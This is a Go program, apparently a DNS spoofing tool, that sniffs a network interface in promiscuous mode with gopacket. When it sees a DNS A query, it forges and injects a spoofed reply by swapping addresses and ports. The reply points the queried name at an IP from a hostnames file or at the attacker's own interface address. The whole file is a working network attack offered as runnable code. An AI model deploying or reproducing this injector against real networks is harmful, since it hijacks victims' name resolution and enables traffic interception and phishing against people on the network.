package main

import (
	"bufio"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"net"
	"os"
	"strings"
)

func getIPv4Addr(addresses []pcap.InterfaceAddress) net.IP {
	for _, addr := range addresses {
		if addr.IP.To4() != nil {
			return addr.IP.To4()
		}
	}
	return nil
}

func main() {
	var interfaceArg, hostnames, expression string
	var handle *pcap.Handle
	var file *os.File
	var err error
	var devices []pcap.Interface
	var packetSource *gopacket.PacketSource
	var defaultInterfaceIP net.IP

	for i := 1; i < len(os.Args); i += 2 {
		if os.Args[i] == "-i" {
			interfaceArg = os.Args[i+1]
		} else if os.Args[i] == "-f" {
			hostnames = os.Args[i+1]
		} else {
			expression = os.Args[i]
			i -= 1
		}
	}

	if interfaceArg != "" { // check if interface is provided
		if handle, err = pcap.OpenLive(interfaceArg, 3000, true, pcap.BlockForever); err != nil {
			panic(err)
		}
	} else { // if interface is not provided -> go to default interface
		if devices, err = pcap.FindAllDevs(); err != nil {
			panic(err)
		} else {
			defaultInterface := devices[0]
			defaultInterfaceIP = getIPv4Addr(defaultInterface.Addresses)
			if handle, err = pcap.OpenLive(defaultInterface.Name, 3000, true, pcap.BlockForever); err != nil {
				panic(err)
			}
		}
	}

	if expression != "" {
		if err = handle.SetBPFFilter(strings.ToLower(expression)); err != nil {
			panic(err)
		}
	}

	packetSource = gopacket.NewPacketSource(handle, handle.LinkType())

	if hostnames != "" {
		if file, err = os.Open(hostnames); err != nil {
			panic(err)
		}

		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		var lines []string

		for scanner.Scan() {
			lines = append(lines, scanner.Text())
		}

		file.Close()

		hostnamePairs := make(map[string]string)

		for _, line := range lines {
			pairs := strings.Split(line, " ")
			hostnamePairs[pairs[len(pairs)-1]] = pairs[0]
		}

		for packet := range packetSource.Packets() {
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				if questions := dnsLayer.(*layers.DNS).Questions; questions != nil {
					for _, question := range questions {
						if question.Type == layers.DNSTypeA {
							if ipAddress, found := hostnamePairs[string(question.Name)]; found {
								temp := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC
								packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC = packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).DstMAC
								packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).DstMAC = temp
								packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).Length = 0

								temp2 := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP
								packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP = packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP
								packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP = temp2
								packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).Length = 0
								packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).Checksum = 0

								temp3 := packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort
								packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort = packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort
								packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort = temp3
								packet.Layer(layers.LayerTypeUDP).(*layers.UDP).Length = 0
								packet.Layer(layers.LayerTypeUDP).(*layers.UDP).Checksum = 0
								packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SetNetworkLayerForChecksum(packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4))

								ip := net.ParseIP(ipAddress)

								answer := layers.DNSResourceRecord{Name: question.Name, Type: layers.DNSTypeA, Class: question.Class, TTL: 13, DataLength: 4, Data: ip.To4(), IP: ip.To4()}
								answers := make([]layers.DNSResourceRecord, 1)
								answers[0] = answer
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Answers = answers
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).QR = true
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).RD = true
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).RA = true
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).ANCount = 1
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).ARCount = 0

								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Authorities = make([]layers.DNSResourceRecord, 0)
								packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Additionals = make([]layers.DNSResourceRecord, 0)

								buffer := gopacket.NewSerializeBuffer()
								options := gopacket.SerializeOptions{
									ComputeChecksums: true,
									FixLengths: true,
								}
								gopacket.SerializeLayers(buffer, options, packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet), packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4), packet.Layer(layers.LayerTypeUDP).(*layers.UDP), packet.Layer(layers.LayerTypeDNS).(*layers.DNS))
								fmt.Printf("Udplayer: %+v", packet.Layer(layers.LayerTypeUDP).(*layers.UDP))
								fmt.Printf("Dnslayer: %+v", packet.Layer(layers.LayerTypeDNS).(*layers.DNS))
								handle.WritePacketData(buffer.Bytes())
							}
						}
					}
				}
			}
		}

	} else {
		for packet := range packetSource.Packets() {
			if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
				if questions := dnsLayer.(*layers.DNS).Questions; questions != nil {
					for _, question := range questions {
						if question.Type == layers.DNSTypeA {
							println(packet.String())
							temp := packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC
							packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).SrcMAC = packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).DstMAC
							packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).DstMAC = temp
							packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet).Length = 0

							temp2 := packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP
							packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).SrcIP = packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP
							packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).DstIP = temp2
							packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).Length = 0
							packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4).Checksum = 0

							temp3 := packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort
							packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SrcPort = packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort
							packet.Layer(layers.LayerTypeUDP).(*layers.UDP).DstPort = temp3
							packet.Layer(layers.LayerTypeUDP).(*layers.UDP).Length = 0
							packet.Layer(layers.LayerTypeUDP).(*layers.UDP).Checksum = 0
							packet.Layer(layers.LayerTypeUDP).(*layers.UDP).SetNetworkLayerForChecksum(packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4))

							answer := layers.DNSResourceRecord{Name: question.Name, Type: layers.DNSTypeA, Class: question.Class, TTL: 13, DataLength: 4, Data: defaultInterfaceIP, IP: defaultInterfaceIP}
							answers := make([]layers.DNSResourceRecord, 1)
							answers[0] = answer
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Answers = answers
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).QR = true
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).RD = true
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).RA = true
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).ANCount = 1
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).ARCount = 0

							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Authorities = make([]layers.DNSResourceRecord, 0)
							packet.Layer(layers.LayerTypeDNS).(*layers.DNS).Additionals = make([]layers.DNSResourceRecord, 0)

							buffer := gopacket.NewSerializeBuffer()
							options := gopacket.SerializeOptions{
								ComputeChecksums: true,
								FixLengths: true,
							}
							gopacket.SerializeLayers(buffer, options, packet.Layer(layers.LayerTypeEthernet).(*layers.Ethernet), packet.Layer(layers.LayerTypeIPv4).(*layers.IPv4), packet.Layer(layers.LayerTypeUDP).(*layers.UDP), packet.Layer(layers.LayerTypeDNS).(*layers.DNS))
							fmt.Printf("Udplayer: %+v", packet.Layer(layers.LayerTypeUDP).(*layers.UDP))
							fmt.Printf("Dnslayer: %+v", packet.Layer(layers.LayerTypeDNS).(*layers.DNS))
							handle.WritePacketData(buffer.Bytes())
						}
					}
				}
			}
		}
	}

}
